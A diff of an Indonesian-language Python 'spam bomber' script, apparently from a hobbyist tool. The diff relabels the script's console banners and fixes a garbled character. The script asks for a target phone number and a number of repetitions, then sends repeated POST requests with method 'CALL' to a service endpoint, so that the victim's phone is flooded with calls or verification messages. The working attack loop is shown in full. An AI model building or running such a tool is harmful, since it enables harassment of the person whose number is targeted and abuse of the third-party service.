@@ -47,12 +47,12 @@ sleep(1)
 print(banner)
 # Jangan di ubah sayang
 print ("")
-print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m PILIHAN Nomor \033[1;33m• \033[0m\033[1;30m]══════════════>")
+print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m INPUT \033[1;33m• \033[0m\033[1;30m]══════════════>")
 print ("")
 print ("\033[37m[\033[31m•\033[37m]\033[32m Contoh\033[37m : \033[37m\033[33m8Xxx\033[33m")
 nomor = input("\033[37m[\033[31m•\033[37m]\033[32m Target\033[32m \033[37m:\033[37m\033[33m ")
-print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m BOM \033[1;33m• \033[0m\033[1;30m]══════════════>")
-jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m Jumlah Spam\033[37m :\033[37m\033[33m "))
+print ("\033[1;30m<════════════[\033[1;33;41m • \033[1;37m OUTPUT \033[1;33m• \033[0m\033[1;30m]══════════════>")
+jumlah = int(input("\033[37m[\033[31m•\033[37m]\033[32m BOM\033[37m :\033[37m\033[33m "))
 mengetik("[KALO SUDAH LIMIT TUNGUH BEBERAPA MENIT LAGI BARU ULANGI NGAB :V] ")
 time.sleep(3)
 # Jangan di ubah sayang ku
@@ -62,4 +62,4 @@ dat = {"method": "CALL","countryCode": "id",}
 # Jangan di ubah sayng
 for i in range(jumlah):
     send = requests.post(url+nomor, headers=ua, data=dat)
-    print(" [â€¢] Status ~+> ",(send.json()["message"]))
+    print(" [•] Status ~+> ",(send.json()["message"]))
